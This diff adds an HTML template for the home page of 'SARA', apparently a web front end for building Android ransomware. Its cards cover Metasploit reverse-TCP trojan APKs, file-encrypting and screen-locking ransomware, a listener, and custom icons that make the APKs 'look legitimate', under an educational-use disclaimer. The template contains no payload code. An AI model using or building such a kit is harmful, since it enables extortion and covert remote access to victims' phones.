@@ -1,0 +1,149 @@
+{% extends "base.html" %}
+
+{% block title %}SARA Web Interface - Home{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="text-center mb-5">
+            <h1 class="display-4 fw-bold text-primary">
+                <i class="bi bi-shield-exclamation"></i> SARA
+            </h1>
+            <p class="lead">Simple Android Ransomware Attack - Web Interface</p>
+            <p class="text-muted">Educational tool for creating Android ransomware applications</p>
+        </div>
+    </div>
+</div>
+
+<div class="row g-4">
+    <!-- Trojan Builder -->
+    <div class="col-lg-6">
+        <div class="card bg-secondary h-100">
+            <div class="card-body d-flex flex-column">
+                <div class="text-center mb-3">
+                    <i class="bi bi-bug display-1 text-danger"></i>
+                </div>
+                <h5 class="card-title text-center">Trojan Builder</h5>
+                <p class="card-text flex-grow-1">
+                    Create custom trojan APKs using Metasploit payload. 
+                    Generate reverse TCP connections for remote access to Android devices.
+                </p>
+                <div class="text-center">
+                    <a href="{{ url_for('trojan') }}" class="btn btn-danger">
+                        <i class="bi bi-bug"></i> Build Trojan
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- File Locker Builder -->
+    <div class="col-lg-6">
+        <div class="card bg-secondary h-100">
+            <div class="card-body d-flex flex-column">
+                <div class="text-center mb-3">
+                    <i class="bi bi-file-lock display-1 text-warning"></i>
+                </div>
+                <h5 class="card-title text-center">File Locker</h5>
+                <p class="card-text flex-grow-1">
+                    Create file encryption ransomware that encrypts user files on the device.
+                    Includes both encrypter and decrypter APKs.
+                </p>
+                <div class="text-center">
+                    <a href="{{ url_for('file_locker') }}" class="btn btn-warning">
+                        <i class="bi bi-file-lock"></i> Build File Locker
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Screen Locker Builder -->
+    <div class="col-lg-6">
+        <div class="card bg-secondary h-100">
+            <div class="card-body d-flex flex-column">
+                <div class="text-center mb-3">
+                    <i class="bi bi-lock display-1 text-info"></i>
+                </div>
+                <h5 class="card-title text-center">Screen Locker</h5>
+                <p class="card-text flex-grow-1">
+                    Create screen lock ransomware with custom messages and passphrase protection.
+                    Locks the device screen until correct passphrase is entered.
+                </p>
+                <div class="text-center">
+                    <a href="{{ url_for('screen_locker') }}" class="btn btn-info">
+                        <i class="bi bi-lock"></i> Build Screen Locker
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Trojan Listener -->
+    <div class="col-lg-6">
+        <div class="card bg-secondary h-100">
+            <div class="card-body d-flex flex-column">
+                <div class="text-center mb-3">
+                    <i class="bi bi-ear display-1 text-success"></i>
+                </div>
+                <h5 class="card-title text-center">Trojan Listener</h5>
+                <p class="card-text flex-grow-1">
+                    Start a Metasploit listener to receive connections from trojan APKs.
+                    Configure host and port for incoming reverse TCP connections.
+                </p>
+                <div class="text-center">
+                    <a href="{{ url_for('listener') }}" class="btn btn-success">
+                        <i class="bi bi-ear"></i> Start Listener
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Features Section -->
+<div class="row mt-5">
+    <div class="col-12">
+        <h3 class="text-center mb-4">Features</h3>
+        <div class="row g-4">
+            <div class="col-md-4">
+                <div class="text-center">
+                    <i class="bi bi-palette display-4 text-primary mb-3"></i>
+                    <h5>Custom Icons</h5>
+                    <p class="text-muted">Upload custom icons for your APK files to make them look legitimate.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="text-center">
+                    <i class="bi bi-gear display-4 text-primary mb-3"></i>
+                    <h5>Configurable</h5>
+                    <p class="text-muted">Customize app names, descriptions, hosts, ports, and passphrases.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="text-center">
+                    <i class="bi bi-download display-4 text-primary mb-3"></i>
+                    <h5>Easy Download</h5>
+                    <p class="text-muted">Download generated APK files directly from the web interface.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Disclaimer -->
+<div class="row mt-5">
+    <div class="col-12">
+        <div class="alert alert-danger">
+            <h5 class="alert-heading">
+                <i class="bi bi-exclamation-triangle"></i> Important Disclaimer
+            </h5>
+            <p class="mb-0">
+                This tool is made for <strong>educational purposes only</strong>. 
+                The author is not responsible for any losses or damage caused by this program.
+                Use responsibly and only on devices you own or have explicit permission to test.
+            </p>
+        </div>
+    </div>
+</div>
+{% endblock %}
